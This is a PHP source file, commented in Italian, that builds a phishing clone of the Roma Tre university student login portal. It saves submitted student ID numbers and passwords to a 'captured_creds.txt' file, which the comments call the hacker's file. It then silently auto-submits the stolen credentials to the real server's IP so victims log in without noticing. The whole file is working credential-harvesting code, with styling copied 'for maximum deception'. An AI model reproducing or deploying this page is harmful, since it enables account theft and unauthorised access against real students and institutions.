<?php
// --- LOGICA DI CATTURA ---
$log_file = 'captured_creds.txt';
$real_server_ip = "110.0.0.50";

if (isset($_POST['matricola'])) {
    $m = $_POST['matricola'];
    $p = $_POST['password'];
    
    // Salvataggio nel file dell'hacker
    $data = "--- CATTURA [" . date("Y-m-d H:i:s") . "] --- Matricola: $m | Password: $p\n";
    file_put_contents($log_file, $data, FILE_APPEND);
    
    // --- SEAMLESS AUTO-LOGIN ---
    // Reindirizziamo al server vero con un form invisibile che si invia da solo (Auto-POST)
    echo "
    <html>
    <body onload='document.forms[0].submit()'>
        <form method='POST' action='http://$real_server_ip/index.php'>
            <input type='hidden' name='matricola' value='".htmlspecialchars($m)."'>
            <input type='hidden' name='password' value='".htmlspecialchars($p)."'>
            <input type='hidden' name='do_login' value='1'>
        </form>
    </body>
    </html>";
    exit();
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Portale Studente - UniRoma3</title>
    <style>
        /* CSS CLONATO DALL'ORIGINALE PER MASSIMO INGANNO */
        body { 
            font-family: 'Segoe UI', Tahoma, sans-serif; 
            margin: 0; 
            height: 100vh;
            background-color: #001a33; /* Sostituto dello sfondo se l'immagine manca */
            background-image: linear-gradient(rgba(0, 0, 0, 0.65), rgba(0, 0, 0, 0.65)), url('sfondo.jpg'); 
            background-size: cover; 
            display: flex; justify-content: center; align-items: center;
        }
        .login-box { 
            background: rgba(255, 255, 255, 0.95); 
            padding: 40px; border-radius: 15px; width: 350px; 
            border-top: 6px solid #004a99; text-align: center; color: #333;
        }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
        .btn-blue { width: 100%; padding: 12px; background-color: #004a99; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1 style="color: #004a99; margin: 0; font-size: 26px;">Roma Tre</h1>
        <p>Accedi ai servizi online</p>
        <form method="POST">
            <input type="text" name="matricola" placeholder="Matricola" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="btn-blue">Entra</button>
        </form>
    </div>
</body>
</html>